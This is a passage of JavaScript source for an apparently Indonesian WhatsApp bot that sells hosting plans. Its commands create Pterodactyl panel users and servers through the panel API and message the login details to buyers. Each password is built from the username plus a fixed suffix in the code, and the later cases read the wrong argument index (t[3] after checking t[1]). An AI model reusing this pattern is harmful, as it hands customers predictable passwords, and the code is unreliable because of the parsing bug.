let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: idsal,
newsletterName: wm,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp8gb': 
case '8gb':
case 'panel8gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "8100"
let cpu = "240"
let disk = "8100"
let email = username + "@gmail.com"
let password = username + "38dy79"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: idsal,
newsletterName: wm,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp9gb': 
case '9gb':
case 'panel9gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "9100"
let cpu = "270"
let disk = "9100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: idsal,
newsletterName: wm,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp10gb': 
case '10gb':
case 'panel10gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "10100"
let cpu = "300"
let disk = "10100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp11gb': 
case '11gb':
case 'panel11gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "11150"
let cpu = "330"
let disk = "11150"
let email = username + "@gmail.com"
let password = username + "64tw9"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp12gb': 
case '12gb':
case 'panel12gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "12150"
let cpu = "360"
let disk = "12150"
let email = username + "@gmail.com"
